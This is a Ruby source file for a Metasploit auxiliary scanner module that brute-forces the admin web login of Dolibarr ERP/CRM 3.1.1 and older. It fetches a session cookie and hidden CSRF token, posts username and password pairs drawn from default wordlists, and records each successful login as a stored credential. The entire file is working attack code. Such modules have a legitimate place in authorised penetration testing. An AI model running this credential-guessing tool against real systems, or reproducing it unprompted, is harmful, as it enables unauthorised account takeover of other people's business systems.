##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Dolibarr ERP/CRM Login Utility',
      'Description'    => %q{
        This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,
        and should only work against version 3.1.1 or older, because these versions do not
        have any default protections against brute forcing.
      },
      'Author'         => [ 'sinn3r' ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
        OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/dolibarr/'])
      ])
  end


  def get_sid_token
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => normalize_uri(@uri)
    })

    return [nil, nil] if res.nil? || res.get_cookies.empty?

    # Get the session ID from the cookie
    m = res.get_cookies.match(/(DOLSESSID_.+);/)
    id = (m.nil?) ? nil : m[1]

    # Get the token from the decompressed HTTP body response
    m = res.body.match(/type="hidden" name="token" value="(.+)"/)
    token = (m.nil?) ? nil : m[1]

    return id, token
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: (ssl ? 'https' : 'http'),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def do_login(user, pass)
    #
    # Get a new session ID/token.  That way if we get a successful login,
    # we won't get a false positive due to reusing the same sid/token.
    #
    sid, token = get_sid_token
    if sid.nil? or token.nil?
      vprint_error("Unable to obtain session ID or token, cannot continue")
      return :abort
    else
      vprint_status("Using sessiond ID: #{sid}")
      vprint_status("Using token: #{token}")
    end

    begin
      res = send_request_cgi({
        'method'   => 'POST',
        'uri'      => normalize_uri("#{@uri}index.php"),
        'cookie'   => sid,
        'vars_post' => {
          'token'         => token,
          'loginfunction' => 'loginfunction',
          'tz'            => '-6',
          'dst'           => '1',
          'screenwidth'   => '1093',
          'screenheight'  => '842',
          'username'      => user,
          'password'      => pass
        }
      })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
      vprint_error("Service failed to respond")
      return :abort
    end

    if res.nil?
      vprint_error("Connection timed out")
      return :abort
    end

    location = res.headers['Location']
    if res and res.headers and (location = res.headers['Location']) and location =~ /admin\//
      print_good("Successful login: \"#{user}:#{pass}\"")
      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.headers['Location'])
      return :next_user
    else
      vprint_error("Bad login: \"#{user}:#{pass}\"")
      return
    end
  end

  def run
    @uri = target_uri.path
    @uri << "/" if @uri[-1, 1] != "/"

    super
  end

  def run_host(ip)
    each_user_pass { |user, pass|
      vprint_status("Trying \"#{user}:#{pass}\"")
      do_login(user, pass)
    }
  end
end
